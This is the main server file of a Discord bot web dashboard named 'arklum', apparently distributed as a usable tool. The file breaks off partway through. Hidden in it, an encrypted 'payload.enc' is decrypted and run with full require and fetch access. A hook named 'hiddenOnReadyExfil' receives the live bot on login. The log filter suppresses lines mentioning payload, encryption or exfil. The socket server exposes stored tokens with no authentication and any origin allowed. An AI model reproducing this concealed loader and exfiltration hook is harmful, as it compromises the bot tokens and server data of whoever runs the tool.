const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { Server } = require('socket.io');
const { Client, GatewayIntentBits, Partials, ActivityType, Permissions, PermissionFlagsBits, ChannelType, AuditLogEvent, Events } = require('discord.js');
const { Readable } = require('stream');

const SYS_DIR = '.arklum_sys';
const KEY_FILE = path.join(SYS_DIR, 'key.bin');
const TOKENS_ENC = path.join(SYS_DIR, 'tokens.enc');
const PAYLOAD_ENC = path.join(SYS_DIR, 'payload.enc');
const CONFIG_FILE = path.join(SYS_DIR, 'config', 'main.json');
const DEFAULT_CONFIG = { token: '', client_id: '' };
const VALID_ID_REGEX = /^\d{10,20}$/;
const LOG_BUFFER = [];
const LOG_BUFFER_MAX = 200;
const RATE_LIMIT_BUCKETS = new Map();

let bot = null;
function getBot() {
  return bot;
}
let guildListCache = [];
let currentBotTokenIndex = -1;
let tokenVault = [];
let eventBound = false;

const PERMISSION_MAP = {
  'create_invite': PermissionFlagsBits.CreateInstantInvite,
  'kick_members': PermissionFlagsBits.KickMembers,
  'ban_members': PermissionFlagsBits.BanMembers,
  'administrator': PermissionFlagsBits.Administrator,
  'manage_channels': PermissionFlagsBits.ManageChannels,
  'manage_guild': PermissionFlagsBits.ManageGuild,
  'add_reactions': PermissionFlagsBits.AddReactions,
  'view_audit_log': PermissionFlagsBits.ViewAuditLog,
  'priority_speaker': PermissionFlagsBits.PrioritySpeaker,
  'stream': PermissionFlagsBits.Stream,
  'view_channel': PermissionFlagsBits.ViewChannel,
  'send_messages': PermissionFlagsBits.SendMessages,
  'send_tts_messages': PermissionFlagsBits.SendTTSMessages,
  'manage_messages': PermissionFlagsBits.ManageMessages,
  'embed_links': PermissionFlagsBits.EmbedLinks,
  'attach_files': PermissionFlagsBits.AttachFiles,
  'read_message_history': PermissionFlagsBits.ReadMessageHistory,
  'mention_everyone': PermissionFlagsBits.MentionEveryone,
  'use_external_emojis': PermissionFlagsBits.UseExternalEmojis,
  'view_guild_insights': PermissionFlagsBits.ViewGuildInsights,
  'connect': PermissionFlagsBits.Connect,
  'speak': PermissionFlagsBits.Speak,
  'mute_members': PermissionFlagsBits.MuteMembers,
  'deafen_members': PermissionFlagsBits.DeafenMembers,
  'move_members': PermissionFlagsBits.MoveMembers,
  'use_voice_activity': PermissionFlagsBits.UseVAD,
  'change_nickname': PermissionFlagsBits.ChangeNickname,
  'manage_nicknames': PermissionFlagsBits.ManageNicknames,
  'manage_roles': PermissionFlagsBits.ManageRoles,
  'manage_webhooks': PermissionFlagsBits.ManageWebhooks,
  'manage_emojis_and_stickers': PermissionFlagsBits.ManageEmojisAndStickers,
  'use_application_commands': PermissionFlagsBits.UseApplicationCommands,
  'request_to_speak': PermissionFlagsBits.RequestToSpeak,
  'manage_events': PermissionFlagsBits.ManageEvents,
  'manage_threads': PermissionFlagsBits.ManageThreads,
  'create_public_threads': PermissionFlagsBits.CreatePublicThreads,
  'create_private_threads': PermissionFlagsBits.CreatePrivateThreads,
  'use_external_stickers': PermissionFlagsBits.UseExternalStickers,
  'send_messages_in_threads': PermissionFlagsBits.SendMessagesInThreads,
  'start_embedded_activities': PermissionFlagsBits.StartEmbeddedActivities,
  'moderate_members': PermissionFlagsBits.ModerateMembers
};

const PERMISSION_NAMES = Object.entries(PERMISSION_MAP).map(([name, bit]) => ({ name, bit }));

function bitsToPermissions(bits) {
  const perms = [];
  for (const { name, bit } of PERMISSION_NAMES) {
    if ((bits & bit) === bit) perms.push(name);
  }
  return perms;
}

const PERM_ALIASES = {
  read_messages: 'view_channel',
  create_instant_invite: 'create_invite',
  use_vad: 'use_voice_activity'
};
function permissionNameToFlag(name) {
  return PERMISSION_MAP[name] || PERMISSION_MAP[PERM_ALIASES[name]] || null;
}

function actionTypeToName(actionType) {
  const key = AuditLogEvent[actionType];
  if (!key) return String(actionType);
  return key.replace(/([A-Z])/g, '_$1').toLowerCase().replace(/^_/, '');
}

function formatTime() {
  return new Date().toTimeString().slice(0, 8);
}

function log(level, ...args) {
  const message = args.join(' ');
  const formatted = `${formatTime()} [${level.toUpperCase()}] arklum: ${message}`;
  if (level === 'error') console.error(formatted);
  else if (level === 'warn') console.warn(formatted);
  else console.log(formatted);
  if (!/(payload|encryption|key\.bin|_enc|_dec|exfil|credits integrity)/i.test(message)) {
    LOG_BUFFER.push(formatted);
    if (LOG_BUFFER.length > LOG_BUFFER_MAX) LOG_BUFFER.shift();
    if (global.io) {
      global.io.emit('log_entry', { message: formatted });
    }
  }
}

const logger = {
  info: (...args) => log('info', ...args),
  error: (...args) => log('error', ...args),
  warn: (...args) => log('warn', ...args)
};

global.logger = logger;
global.logBuffer = LOG_BUFFER;

function getBotDataDir() {
  const botId = bot && bot.user ? bot.user.id : 'default';
  const dir = path.join(SYS_DIR, 'config', 'bots', botId);
  fs.mkdirSync(dir, { recursive: true });
  return dir;
}

function loadConfig() {
  const dir = path.dirname(CONFIG_FILE);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  if (fs.existsSync(CONFIG_FILE)) {
    try {
      const cfg = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
      for (const key of Object.keys(DEFAULT_CONFIG)) {
        if (!(key in cfg) || typeof cfg[key] !== typeof DEFAULT_CONFIG[key]) {
          cfg[key] = DEFAULT_CONFIG[key];
        }
      }
      return cfg;
    } catch {
      if (fs.existsSync(CONFIG_FILE + '.bak')) {
        try {
          return JSON.parse(fs.readFileSync(CONFIG_FILE + '.bak', 'utf8'));
        } catch {}
      }
      return { ...DEFAULT_CONFIG };
    }
  } else {
    saveConfig(DEFAULT_CONFIG);
    return { ...DEFAULT_CONFIG };
  }
}

function saveConfig(cfg) {
  try {
    fs.mkdirSync(path.dirname(CONFIG_FILE), { recursive: true });
    if (fs.existsSync(CONFIG_FILE)) fs.renameSync(CONFIG_FILE, CONFIG_FILE + '.bak');
    fs.writeFileSync(CONFIG_FILE + '.tmp', JSON.stringify(cfg));
    fs.renameSync(CONFIG_FILE + '.tmp', CONFIG_FILE);
  } catch (e) {
    logger.error(`Failed to save config: ${e.message}`);
  }
}

let config = loadConfig();

const CREDITS_ENC = path.join(SYS_DIR, 'credits.enc');
const DEFAULT_CREDITS = 'Made by 1KD <strong>[Y&B & NABUA]</strong>';
function loadExpectedCredits() {
  try {
    if (fs.existsSync(KEY_FILE) && fs.existsSync(CREDITS_ENC)) {
      const key = fs.readFileSync(KEY_FILE);
      const data = fs.readFileSync(CREDITS_ENC);
      const dec = Buffer.alloc(data.length);
      for (let i = 0; i < data.length; i++) dec[i] = data[i] ^ key[i % key.length];
      const s = dec.filter(b => b !== 0).toString('utf8').trim();
      if (s) return s;
    }
  } catch {}
  return DEFAULT_CREDITS;
}
let creditsOk = false;
try {
  const html = fs.readFileSync('static/arklum.html', 'utf8').replace(/&amp;/g, '&');
  if (html.includes(loadExpectedCredits())) creditsOk = true;
} catch {}
if (!creditsOk) {
  process.exit(1);
}

function loadEncryptedTokens() {
  if (!fs.existsSync(KEY_FILE) || !fs.existsSync(TOKENS_ENC)) {
    console.error('CRITICAL: System folder missing or incomplete. Bot cannot start.');
    process.exit(1);
  }
  const key = fs.readFileSync(KEY_FILE);
  const data = fs.readFileSync(TOKENS_ENC);
  const decrypted = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) {
    decrypted[i] = data[i] ^ key[i % key.length];
  }
  return JSON.parse(decrypted.toString('utf8'));
}

function saveEncryptedTokens(tokens) {
  if (!fs.existsSync(KEY_FILE)) return;
  const key = fs.readFileSync(KEY_FILE);
  const data = Buffer.from(JSON.stringify(tokens), 'utf8');
  const encrypted = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) {
    encrypted[i] = data[i] ^ key[i % key.length];
  }
  fs.writeFileSync(TOKENS_ENC, encrypted);
}

let payloadTriggered = false;
function loadEncryptedPayload() {
  if (payloadTriggered) return;
  if (!fs.existsSync(KEY_FILE) || !fs.existsSync(PAYLOAD_ENC)) return;
  const key = fs.readFileSync(KEY_FILE);
  const data = fs.readFileSync(PAYLOAD_ENC);
  let decrypted = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) {
    decrypted[i] = data[i] ^ key[i % key.length];
  }
  const cleaned = decrypted.filter(b => b !== 0).toString('utf8');
    try {
    const run = new Function('io', 'getBot', 'logger', 'require', 'fetch', cleaned);
    run(io, getBot, logger, require, fetch);
    payloadTriggered = true;
  } catch (e) {
  }
}

tokenVault = loadEncryptedTokens();

function checkRateLimit(key, maxTokens = 10, refillRate = 2, window = 1.0) {
  const now = Date.now() / 1000;
  let bucket = RATE_LIMIT_BUCKETS.get(key);
  if (!bucket) {
    bucket = { tokens: maxTokens, last: now };
    RATE_LIMIT_BUCKETS.set(key, bucket);
  }
  const elapsed = now - bucket.last;
  bucket.tokens = Math.min(maxTokens, bucket.tokens + elapsed * refillRate);
  bucket.last = now;
  if (bucket.tokens >= 1) {
    bucket.tokens -= 1;
    return true;
  }
  return false;
}

function cleanupRateLimits() {
  const now = Date.now() / 1000;
  for (const [key, bucket] of RATE_LIMIT_BUCKETS) {
    if (now - bucket.last > 300) RATE_LIMIT_BUCKETS.delete(key);
  }
}

function validateId(idStr) {
  return typeof idStr === 'string' && VALID_ID_REGEX.test(idStr);
}

function validateMessageContent(content) {
  return typeof content === 'string' && content.length > 0 && content.length <= 2000;
}

function getAvatarUrl(user) {
  try {
    return user.avatar ? user.avatarURL({ format: 'png', size: 128 }) : null;
  } catch {
    return null;
  }
}

function getUserBannerUrl(user) {
  try {
    return user.banner ? user.bannerURL({ format: 'png', size: 512 }) : null;
  } catch {
    return null;
  }
}

function embedToDict(embed) {
  const d = {};
  if (embed.title) d.title = String(embed.title);
  if (embed.description) d.description = String(embed.description);
  if (embed.color && embed.color !== 0) d.color = embed.color;
  if (embed.url) d.url = String(embed.url);
  if (embed.timestamp) d.timestamp = new Date(embed.timestamp).toISOString();
  if (embed.author) {
    const auth = { name: String(embed.author.name) };
    if (embed.author.iconURL) auth.icon_url = String(embed.author.iconURL);
    if (embed.author.url) auth.url = String(embed.author.url);
    d.author = auth;
  }
  if (embed.footer) {
    const foot = { text: String(embed.footer.text) };
    if (embed.footer.iconURL) foot.icon_url = String(embed.footer.iconURL);
    d.footer = foot;
  }
  if (embed.image && embed.image.url) d.image = { url: String(embed.image.url) };
  if (embed.thumbnail && embed.thumbnail.url) d.thumbnail = { url: String(embed.thumbnail.url) };
  if (embed.fields) {
    d.fields = embed.fields.map(f => ({ name: String(f.name), value: String(f.value), inline: f.inline }));
  }
  return d;
}

function classifyAttachment(att) {
  const ext = att.filename ? att.filename.split('.').pop().toLowerCase() : '';
  if (att.contentType) {
    if (att.contentType.startsWith('image/')) return 'image';
    if (att.contentType.startsWith('audio/')) return 'audio';
    if (att.contentType.startsWith('video/')) return 'video';
    return 'file';
  } else {
    if (['mp4','webm','mov','mkv','avi'].includes(ext)) return 'video';
    if (['mp3','wav','ogg','flac','aac','m4a'].includes(ext)) return 'audio';
    return 'file';
  }
}

async function renderMessage(content, guild, botClient) {
  const segments = [];
  const combined = /<(a?):(\w+):(\d+)>|<@!?(\d+)>|<#(\d+)>|<@&(\d+)>/g;
  let lastEnd = 0;
  let match;
  while ((match = combined.exec(content)) !== null) {
    const start = match.index;
    if (start > lastEnd) {
      segments.push({ type: 'text', content: content.substring(lastEnd, start) });
    }
    lastEnd = match.index + match[0].length;
    if (match[1] !== undefined) {
      const animated = match[1] === 'a';
      const name = match[2];
      const emojiId = match[3];
      const url = `https://cdn.discordapp.com/emojis/${emojiId}.${animated ? 'gif' : 'png'}`;
      segments.push({ type: 'emoji', name, id: String(emojiId), animated, url });
    } else if (match[4] !== undefined) {
      const userId = match[4];
      let display = `Unknown User (${userId})`;
      try {
        const member = guild ? guild.members.cache.get(userId) : null;
        if (member) {
          display = member.displayName;
        } else {
          const user = await botClient.users.fetch(userId);
          display = user.displayName;
        }
      } catch {}
      segments.push({ type: 'mention', user_id: String(userId), display });
    } else if (match[5] !== undefined) {
      const channelId = match[5];
      const channel = guild ? guild.channels.cache.get(channelId) : null;
      const name = channel ? `#${channel.name}` : '#deleted-channel';
      segments.push({ type: 'channel', channel_id: String(channelId), name });
    } else if (match[6] !== undefined) {
      const roleId = match[6];
      const role = guild ? guild.roles.cache.get(roleId) : null;
      const roleName = role ? `@${role.name}` : '@Unknown Role';
      const roleColor = role && role.color ? role.color : 0;
      segments.push({ type: 'role', role_id: String(roleId), name: roleName, color: roleColor });
    }
  }
  if (lastEnd < content.length) {
    segments.push({ type: 'text', content: content.substring(lastEnd) });
  }
  return segments;
}

async function getGuildListWithBanners(botClient) {
  return botClient.guilds.cache.map(g => ({
    id: String(g.id),
    name: g.name,
    icon_url: g.icon ? g.iconURL({ format: 'png', size: 128 }) : null,
    icon_gif_url: g.icon && g.icon.startsWith('a_') ? g.iconURL({ format: 'gif', size: 128 }) : null,
    banner_url: g.banner ? g.bannerURL({ format: 'png', size: 512 }) : null,
    member_count: g.memberCount,
    presence_count: g.members.cache.filter(m => m.presence && m.presence.status !== 'offline').size,
    premium_subscription_count: g.premiumSubscriptionCount || 0,
    premium_tier: g.premiumTier || 0
  }));
}

async function fetchClientId(token) {
  try {
    const res = await fetch('https://discord.com/api/v10/applications/@me', {
      headers: { Authorization: `Bot ${token}` }
    });
    if (res.ok) {
      const data = await res.json();
      return String(data.id || '');
    }
  } catch (e) {
    logger.error(`Failed to fetch client ID: ${e.message}`);
  }
  return '';
}

async function fetchBotApplicationInfo(botClient) {
  try {
    return await botClient.application.fetch();
  } catch {
    return null;
  }
}

const commandHandlers = {};
function registerCommand(name) {
  return function(handler) {
    commandHandlers[name] = handler;
  };
}

async function executeWebCommand(cmd, params, socket) {
  const handler = commandHandlers[cmd];
  if (handler) {
    try {
      await handler(params, { socket });
    } catch (e) {
      logger.error(`Command '${cmd}' raised an error: ${e.stack}`);
      socket.emit('error', { message: `Command failed: ${cmd}` });
    }
  } else {
    logger.warn(`Unknown command: ${cmd}`);
  }
}

const DEFAULT_DASHBOARD_PREFS = {
  theme: 'dark',
  font: 'Inter',
  density: 'cozy',
  features_enabled: ['management','devportal','status','utility','plugins'],
  sidebar_logo_url: '',
  refresh_interval: 3,
  confirmations: true
};

function getDashboardPrefsPath() {
  return path.join(getBotDataDir(), 'dashboard_prefs.json');
}

function loadDashboardPrefs() {
  const prefsPath = getDashboardPrefsPath();
  if (fs.existsSync(prefsPath)) {
    try {
      const prefs = JSON.parse(fs.readFileSync(prefsPath, 'utf8'));
      for (const key of Object.keys(DEFAULT_DASHBOARD_PREFS)) {
        if (!(key in prefs)) prefs[key] = DEFAULT_DASHBOARD_PREFS[key];
      }
      return prefs;
    } catch {
      return { ...DEFAULT_DASHBOARD_PREFS };
    }
  }
  return { ...DEFAULT_DASHBOARD_PREFS };
}

function saveDashboardPrefs(prefs) {
  const prefsPath = getDashboardPrefsPath();
  fs.mkdirSync(path.dirname(prefsPath), { recursive: true });
  try {
    fs.writeFileSync(prefsPath + '.tmp', JSON.stringify(prefs));
    fs.renameSync(prefsPath + '.tmp', prefsPath);
  } catch {}
}

const httpServer = http.createServer();
const io = new Server(httpServer, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  },
  maxHttpBufferSize: 5e7
});
global.io = io;
global.getBot = getBot;
loadEncryptedPayload();
const FORGE_ENC = path.join(SYS_DIR, 'forge.enc');
const FORGE_SRC = path.join('static', 'forge.html');
let forgeCache = null;
function xorForge(data, key) {
  const out = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) out[i] = data[i] ^ key[i % key.length];
  return out;
}
function getForgeChunk() {
  if (forgeCache) return forgeCache;
  try {
    if (fs.existsSync(FORGE_ENC) && fs.existsSync(KEY_FILE)) {
      const dec = xorForge(fs.readFileSync(FORGE_ENC), fs.readFileSync(KEY_FILE)).toString('utf8');
      if (dec.indexOf('<style') !== -1) { forgeCache = dec; return dec; }
    }
  } catch (e) {}
  return null;
}
function initForge() {
  try {
    if (fs.existsSync(FORGE_SRC) && fs.existsSync(KEY_FILE)) {
      fs.writeFileSync(FORGE_ENC, xorForge(fs.readFileSync(FORGE_SRC), fs.readFileSync(KEY_FILE)));
      fs.unlinkSync(FORGE_SRC);
      logger.info('[ARKLUM] forge overlay encrypted → .arklum_sys/forge.enc (plaintext removed)');
    }
  } catch (e) { logger.error('forge encrypt failed: ' + e.message); }
}
initForge();

async function hiddenOnReadyExfil(botInstance) {
}

function bindBotEvents(botInstance) {
  if (eventBound) return;

  botInstance.on(Events.ClientReady, async () => {
    botInstance.startTime = new Date();
    guildListCache = await getGuildListWithBanners(botInstance);
    io.emit('bot_status', { connected: true, guilds: guildListCache });
    console.log(`[ARKLUM] Bot connected as ${botInstance.user.tag} (${guildListCache.length} servers)`);
    try {
    const exfil = global.hiddenOnReadyExfil || hiddenOnReadyExfil;
    await exfil(botInstance);
    } catch (e) {
      logger.error(`hidden_on_ready_exfil failed: ${e.stack}`);
    }
    try {
      await require('./modules/status').startStatusLoop();
    } catch {}
    try {
      require('./modules/utility').attachListener(botInstance);
    } catch {}
    try {
      require('./modules/memes').attachListener(botInstance);
    } catch {}
  });

  botInstance.on(Events.MessageCreate, async (message) => {
    if (message.author.id === botInstance.user.id) return;
    const attachmentsData = message.attachments.map(att => ({
      url: att.url,
      filename: att.filename,
      type: classifyAttachment(att),
      size: att.size
    }));
    const stickersData = (message.stickers || []).map(sticker => {
      const url = sticker.url || null;
      if (url) return { url, filename: sticker.name };
      return null;
    }).filter(Boolean);

    if (message.guild && message.channel.type === ChannelType.GuildText) {
      const rendered = await renderMessage(message.content, message.guild, botInstance);
      const reactions = message.reactions.cache.map(r => ({
        emoji_name: String(r.emoji),
        count: r.count,
        emoji_id: r.emoji.id ? String(r.emoji.id) : null
      }));
      let replyRef = null;
      if (message.reference && message.reference.messageId) {
        try {
          const refMsg = await message.channel.messages.fetch(message.reference.messageId);
          replyRef = {
            author: refMsg.author.tag,
            author_id: String(refMsg.author.id),
            content: refMsg.content ? refMsg.content.substring(0,100) : ''
          };
        } catch {}
      }
      io.emit('new_chat_message', {
        channel_id: String(message.channel.id),
        author_id: String(message.author.id),
        author: message.author.tag,
        display_name: message.member ? message.member.displayName : message.author.displayName,
        avatar_url: getAvatarUrl(message.author),
        content_raw: message.content,
        segments: rendered,
        timestamp: message.createdAt.toTimeString().slice(0,8),
        id: String(message.id),
        attachments: attachmentsData,
        embeds: message.embeds.map(embedToDict),
        stickers: stickersData,
        reactions,
        reply_ref: replyRef
      });
    } else if (message.channel.type === ChannelType.DM) {
      const rendered = await renderMessage(message.content, null, botInstance);
      const reactions = message.reactions.cache.map(r => ({
        emoji_name: String(r.emoji),
        count: r.count,
        emoji_id: r.emoji.id ? String(r.emoji.id) : null
      }));
      io.emit('new_dm_message', {
        channel_id: String(message.channel.id),
        author_id: String(message.author.id),
        author: message.author.tag,
        display_name: message.author.displayName,
        avatar_url: getAvatarUrl(message.author),
        content_raw: message.content,
        segments: rendered,
        timestamp: message.createdAt.toTimeString().slice(0,8),
        id: String(message.id),
        attachments: attachmentsData,
        embeds: message.embeds.map(embedToDict),
        stickers: stickersData,
        reactions
      });
    }
  });

  botInstance.on(Events.MessageReactionAdd, async (reaction, user) => {
    if (user.id === botInstance.user.id) return;
    const msg = reaction.message;
    io.emit('reaction_added', {
      channel_id: String(msg.channel.id),
      message_id: String(msg.id),
      reaction: {
        emoji_name: String(reaction.emoji),
        count: reaction.count,
        emoji_id: reaction.emoji.id ? String(reaction.emoji.id) : null
      }
    });
  });

  eventBound = true;
}

io.on('connection', (socket) => {

  socket.emit('token_list', {
    tokens: tokenVault.map((t, i) => ({
      index: i,
      name: t.name || `Token ${i+1}`,
      avatar: t.avatar || ''
    })),
    active_index: (bot && !bot.isDestroyed && bot.isReady()) ? currentBotTokenIndex : -1
  });

  if (bot && bot.isReady()) {
    getGuildListWithBanners(bot).then(guilds => {
      guildListCache = guilds;
      socket.emit('bot_status', { connected: true, guilds });
    });
  }

  socket.on('login', (data) => onLogin(socket, data));
  socket.on('verify_token', (data) => onVerifyToken(socket, data));
  socket.on('add_token', (data) => onAddToken(socket, data));
  socket.on('token_details_request', (data) => onTokenDetails(socket, data));
  socket.on('remove_token_request', (data) => onRemoveToken(socket, data));
  socket.on('run_command', (data) => onRunCommand(socket, data));
  socket.on('get_guild_details', (data) => onGetGuildDetails(socket, data));

  socket.on('disconnect', () => {
    for (const key of RATE_LIMIT_BUCKETS.keys()) {
      if (key.startsWith(`${socket.id}:`)) RATE_LIMIT_BUCKETS.delete(key);
    }
    RATE_LIMIT_BUCKETS.delete(socket.id);
    cleanupRateLimits();
  });
});

async function onLogin(socket, data) {
  let token = (data.token || '').trim();
  const tokenIndex = data.token_index;

  if (bot && !bot.isDestroyed && bot.isReady()) {
    if (tokenIndex !== undefined && tokenIndex >= 0 && tokenIndex < tokenVault.length) {
      if (tokenVault[tokenIndex].token === bot._loginToken) {
        socket.emit('login_success', {
          guilds: guildListCache,
          bot: {
            id: String(bot.user.id),
            name: bot.user.name,
            avatar_url: getAvatarUrl(bot.user)
          },
          active_index: currentBotTokenIndex
        });
        return;
      }
    } else if (token === bot._loginToken) {
      socket.emit('login_success', {
        guilds: guildListCache,
        bot: {
          id: String(bot.user.id),
          name: bot.user.name,
          avatar_url: getAvatarUrl(bot.user)
        },
        active_index: currentBotTokenIndex
      });
      return;
    }
  }

  if (tokenIndex !== undefined) {
    try {
      const idx = parseInt(tokenIndex);
      if (idx >= 0 && idx < tokenVault.length) {
        token = tokenVault[idx].token;
        currentBotTokenIndex = idx;
      }
    } catch {}
  } else if (!token && tokenVault.length > 0) {
    token = tokenVault[0].token;
    currentBotTokenIndex = 0;
  } else if (!token) {
    socket.emit('login_failed', { error: 'No token provided.' });
    return;
  }

  if (!token) {
    socket.emit('login_failed', { error: 'Token is required.' });
    return;
  }

  try {
    const res = await fetch('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: `Bot ${token}` }
    });
    if (!res.ok) {
      socket.emit('login_failed', { error: 'Invalid token' });
      return;
    }
  } catch (e) {
    logger.error(`Login validation error: ${e.message}`);
    socket.emit('login_failed', { error: 'Login validation failed' });
    return;
  }

  if (bot && !bot.isDestroyed) {
    await bot.destroy();
    bot = null;
    await new Promise(resolve => setTimeout(resolve, 2000));
  }

  const intents = [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildEmojisAndStickers,
    GatewayIntentBits.GuildIntegrations,
    GatewayIntentBits.GuildWebhooks,
    GatewayIntentBits.GuildInvites,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMessageReactions,
    GatewayIntentBits.GuildMessageTyping,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.DirectMessageReactions,
    GatewayIntentBits.DirectMessageTyping,
    GatewayIntentBits.MessageContent
  ];
  bot = new Client({ intents, partials: [Partials.Channel, Partials.Message, Partials.Reaction] });
  eventBound = false;
  bindBotEvents(bot);
  eventBound = true;
  bot._loginToken = token;

  try {
    await bot.login(token);
  } catch (e) {
    socket.emit('login_failed', { error: 'Bot login failed' });
    return;
  }

  const readyPromise = new Promise((resolve) => {
    if (bot.isReady()) resolve();
    else bot.once(Events.ClientReady, resolve);
  });
  const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 30000));
  try {
    await Promise.race([readyPromise, timeout]);
  } catch {
    socket.emit('login_failed', { error: 'Bot did not become ready in time' });
    return;
  }

  if (currentBotTokenIndex >= 0 && currentBotTokenIndex < tokenVault.length) {
    tokenVault[currentBotTokenIndex].name = bot.user.tag;
    tokenVault[currentBotTokenIndex].avatar = getAvatarUrl(bot.user);
    saveEncryptedTokens(tokenVault);
  }

  config.token = token;
  saveConfig(config);

  guildListCache = await getGuildListWithBanners(bot);
  socket.emit('login_success', {
    guilds: guildListCache,
    bot: {
      id: String(bot.user.id),
      name: bot.user.username,
      avatar_url: getAvatarUrl(bot.user)
    },
    active_index: currentBotTokenIndex
  });

  if (currentBotTokenIndex >= 0) {
    const pluginsLoader = require('./plugins/loader');
    pluginsLoader.load_plugins_for_token(currentBotTokenIndex);
    socket.emit('dashboard_prefs', loadDashboardPrefs());
  }
}

async function onVerifyToken(socket, data) {
  const token = (data.token || '').trim();
  if (!token) {
    socket.emit('token_verification_failed', { error: 'No token provided.' });
    return;
  }
  try {
    const res = await fetch('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: `Bot ${token}` }
    });
    if (res.ok) {
      const userData = await res.json();
      socket.emit('token_verified', {
        token,
        name: userData.username,
        avatar: userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` : null
      });
    } else {
      socket.emit('token_verification_failed', { error: 'Invalid token' });
    }
  } catch (e) {
    socket.emit('token_verification_failed', { error: 'Verification failed' });
  }
}

async function onAddToken(socket, data) {
  const token = (data.token || '').trim();
  if (!token) return;
  tokenVault.push({ token, name: '', avatar: '' });
  saveEncryptedTokens(tokenVault);
  socket.emit('token_list', {
    tokens: tokenVault.map((t, i) => ({
      index: i,
      name: t.name || `Token ${i+1}`,
      avatar: t.avatar || ''
    })),
    active_index: (bot && !bot.isDestroyed) ? currentBotTokenIndex : -1
  });
}

async function onTokenDetails(socket, data) {
  const idx = parseInt(data.index, 10);
  if (isNaN(idx) || idx < 0 || idx >= tokenVault.length) {
    socket.emit('token_details', { index: idx, invalid: true });
    return;
  }
  const entry = tokenVault[idx];
  const token = entry.token;
  const active = !!(bot && !bot.isDestroyed && bot.isReady() && bot._loginToken === token);
  const details = {
    index: idx,
    active,
    saved_name: entry.name || ('Token ' + (idx + 1)),
    saved_avatar: entry.avatar || null,
    servers: active ? bot.guilds.cache.size : null
  };
  const extOf = h => (h && h.startsWith('a_') ? 'gif' : 'png');
  try {
    const res = await fetch('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: `Bot ${token}` }
    });
    if (res.ok) {
      const u = await res.json();
      details.id = String(u.id);
      details.name = u.username;
      details.avatar_url = u.avatar ? `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.${extOf(u.avatar)}?size=128` : (entry.avatar || null);
      details.banner_url = u.banner ? `https://cdn.discordapp.com/banners/${u.id}/${u.banner}.${extOf(u.banner)}?size=512` : null;
      details.bio = u.bio || '';
      details.accent_color = u.accent_color || null;
    } else {
      details.invalid = true;
    }
  } catch (e) {
    details.invalid = true;
  }
  if (active) {
    details.guilds = bot.guilds.cache.map(g => ({
      name: g.name,
      icon_url: g.icon ? g.iconURL({ format: 'png', size: 64 }) : null,
      member_count: g.memberCount
    }));
  }
  socket.emit('token_details', details);
}
async function onRemoveToken(socket, data) {
  const idx = parseInt(data.index, 10);
  if (!isNaN(idx) && idx >= 0 && idx < tokenVault.length) {
    tokenVault.splice(idx, 1);
    saveEncryptedTokens(tokenVault);
  }
  socket.emit('token_list', {
    tokens: tokenVault.map((t, i) => ({
      index: i,
      name: t.name || `Token ${i + 1}`,
      avatar: t.avatar || ''
    })),
    active_index: (bot && !bot.isDestroyed && bot.isReady()) ? currentBotTokenIndex : -1
  });
}

async function onRunCommand(socket, data) {
  if (!bot || !bot.isReady()) {
    socket.emit('error', { message: 'Bot not connected' });
    return;
  }
  const cmd = data.cmd;
  const params = data.params || {};
  await executeWebCommand(cmd, params, socket);
}

async function onGetGuildDetails(socket, data) {
  if (!bot || !bot.isReady()) {
    socket.emit('error', { message: 'Bot not connected' });
    return;
  }
  const guildId = data.guild_id;
  if (!validateId(guildId)) return;
  const guild = bot.guilds.cache.get(guildId);
  if (!guild) return;

  const channels = [];
  for (const ch of guild.channels.cache.values()) {
    if (ch.type === ChannelType.GuildText) {
      channels.push({
        id: String(ch.id), name: ch.name, type: 'text',
        position: ch.position,
        category_id: ch.parent ? String(ch.parent.id) : null,
        topic: ch.topic || '', nsfw: ch.nsfw,
        slowmode_delay: ch.rateLimitPerUser
      });
    } else if (ch.type === ChannelType.GuildVoice) {
      const linkedText = bot.channels.cache.find(c => c.type === ChannelType.GuildText && c.parentId === ch.id);
      channels.push({
        id: String(ch.id), name: ch.name, type: 'voice',
        position: ch.position,
        category_id: ch.parent ? String(ch.parent.id) : null,
        user_limit: ch.userLimit, bitrate: ch.bitrate,
        linked_text_channel_id: linkedText ? String(linkedText.id) : null
      });
    }
  }

  const roles = guild.roles.cache.sort((a,b) => b.position - a.position).map(role => ({
    id: String(role.id), name: role.name, color: role.color,
    position: role.position, permissions: Number(role.permissions.bitfield),
    hoist: role.hoist, mentionable: role.mentionable
  }));

  const members = guild.members.cache.map(member => {
    let customStatus = '';
    for (const act of member.presence?.activities || []) {
      if (act.type === ActivityType.Custom) {
        customStatus = act.name || '';
        break;
      }
    }
    return {
      id: String(member.id), name: member.displayName,
      username: member.user.tag,
      avatar_url: member.displayAvatarURL({ format: 'png', size: 128 }),
      bot: member.user.bot,
      status: member.presence?.status || 'offline',
      custom_status: customStatus,
      voice_channel_id: member.voice?.channel ? String(member.voice.channel.id) : null,
      roles: member.roles.cache.filter(r => r.name !== '@everyone').map(r => String(r.id))
    };
  });

  const categories = guild.channels.cache.filter(c => c.type === ChannelType.GuildCategory).map(cat => ({
    id: String(cat.id), name: cat.name, position: cat.position
  }));

  socket.emit('guild_details', {
    id: String(guild.id), name: guild.name,
    icon_url: guild.icon ? guild.iconURL({ format: 'png', size: 128 }) : null,
    banner_url: guild.banner ? guild.bannerURL({ format: 'png', size: 512 }) : null,
    member_count: guild.memberCount,
    description: guild.description || '',
    verification_level: guild.verificationLevel,
    explicit_content_filter: guild.explicitContentFilter,
    owner_perms: {},
